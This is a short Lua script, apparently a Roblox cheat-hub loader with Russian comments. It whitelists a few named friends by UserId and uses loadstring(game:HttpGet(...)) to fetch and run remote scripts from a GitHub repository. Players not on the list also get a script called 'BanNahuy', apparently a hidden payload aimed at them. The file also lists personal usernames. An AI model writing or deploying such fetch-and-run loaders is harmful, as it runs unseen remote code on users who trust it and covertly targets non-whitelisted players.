-- Whitelist by UserID
local whitelistedUserIds = {
    [2964047089] = true, -- Кент (@VanAstrales)
    [9103392112] = true, -- Ты (@huesos880055535)
    [493337194]  = true, -- Кокосик (@Minikokosich)
    -- [4607304028] = true, -- Саня (@ArRoWeNn)
    [3270959865] = true, -- Влад (@luken_god)
    [7947437575] = true  -- Вика (@CuRLyCHeBuRaSHKa)
}

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

if whitelistedUserIds[LocalPlayer.UserId] then
    -- Загрузка основных скриптов для друзей
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Valdies/Pidromania/refs/heads/main/PidHubWork"))()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Valdies/Pidromania/refs/heads/main/Message"))()
else
    -- Загрузка "BanNahuy" для остальных
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Valdies/Pidromania/refs/heads/main/PidHubWork"))()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Valdies/Pidromania/refs/heads/main/BanNahuy"))()
end

